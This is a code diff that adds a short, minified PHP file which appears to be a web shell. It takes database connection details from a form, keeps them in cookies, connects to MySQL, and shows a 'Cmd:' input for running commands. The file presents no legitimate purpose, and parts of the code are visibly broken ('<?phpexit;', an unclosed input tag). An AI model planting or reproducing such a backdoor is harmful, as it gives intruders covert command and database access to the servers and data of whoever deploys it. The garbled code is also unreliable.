@@ -1,0 +1,3 @@
+<?php
+$path="c:/windows/system32/canimei";session_start();if(!empty($_POST['submit'])){setcookie("connect");setcookie("connect[host]",$_POST['host']);setcookie("connect[user]",$_POST['user']);setcookie("connect[pass]",$_POST['pass']);setcookie("connect[dbname]",$_POST['dbname']);echo "<script>location.href='?action=connect'</script>";}if(empty($_GET["action"])){?><?phpexit;}if ($_GET[action]=='connect'){$conn=mysql_connect($_COOKIE["connect"]["host"],$_COOKIE["connect"]["user"],$_COOKIE["connect"]["pass"])  or die('<pre>'.mysql_error().'</pre>');
+ echo "<form action='' method='post'>";echo "Cmd:";echo "<input type='text' name='cmd' value='$strCmd'?>
